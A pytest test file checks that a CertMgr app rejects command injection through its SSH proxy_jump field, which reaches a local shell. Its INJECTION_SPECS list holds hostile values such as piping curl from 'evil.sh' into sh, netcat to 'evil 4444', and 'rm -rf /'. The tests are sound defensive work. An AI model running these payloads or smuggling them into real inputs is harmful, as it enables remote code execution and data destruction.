"""proxy_jump reaches a locally shell-executed paramiko ProxyCommand, so an
unvalidated user/host is command injection on the CertMgr host itself, not
just the remote server. No test coverage existed for this field at all."""

from __future__ import annotations

import pytest

from app.core.domain_utils import validate_proxy_jump
from app.core.exceptions import ValidationAppError

INJECTION_SPECS = [
    "root@host; touch /tmp/pwned",
    "root@host && curl evil.sh | sh",
    "root@`whoami`",
    "root@host$(id)",
    "root@host|nc evil 4444",
    "root@host\ntouch /tmp/pwned",
    "root; rm -rf /@host",
    "not-a-valid-spec",
    "root@",
    "@host",
    "root@host:notaport",
    "root@host:99999",
]


@pytest.mark.parametrize("spec", INJECTION_SPECS)
def test_validate_proxy_jump_rejects_injection(spec):
    with pytest.raises(ValidationAppError):
        validate_proxy_jump(spec)


@pytest.mark.parametrize(
    "spec",
    ["root@bastion.example.com", "deploy_user@10.0.0.5", "root@bastion.example.com:2222"],
)
def test_validate_proxy_jump_accepts_clean_specs(spec):
    assert validate_proxy_jump(spec) == spec


def test_server_create_schema_rejects_malicious_proxy_jump():
    # Same as the pre-existing _hostname/_ip validators on this schema:
    # ValidationAppError isn't a ValueError, so pydantic propagates it as-is
    # rather than wrapping it into pydantic.ValidationError. The API-level
    # test below confirms the real request path still yields a clean 422.
    from app.schemas.server import ServerCreate

    with pytest.raises(ValidationAppError):
        ServerCreate(hostname="example.com", proxy_jump="root@host; touch /tmp/pwned")


def test_server_update_schema_rejects_malicious_proxy_jump():
    from app.schemas.server import ServerUpdate

    with pytest.raises(ValidationAppError):
        ServerUpdate(proxy_jump="root@`whoami`")


def test_ssh_client_build_proxy_socket_rejects_injection():
    from app.services.ssh import SSHClient, SSHConfig, SSHConnectionError

    client = SSHClient(SSHConfig(hostname="target.example.com", proxy_jump="root@host; touch /tmp/pwned"))
    with pytest.raises(SSHConnectionError):
        client.connect()


def test_create_server_api_rejects_malicious_proxy_jump(client, admin_headers):
    resp = client.post(
        "/api/v1/servers",
        json={"hostname": "proxy-test.example.com", "ssh_user": "root", "proxy_jump": "root@host; touch /tmp/pwned"},
        headers=admin_headers,
    )
    assert resp.status_code == 422
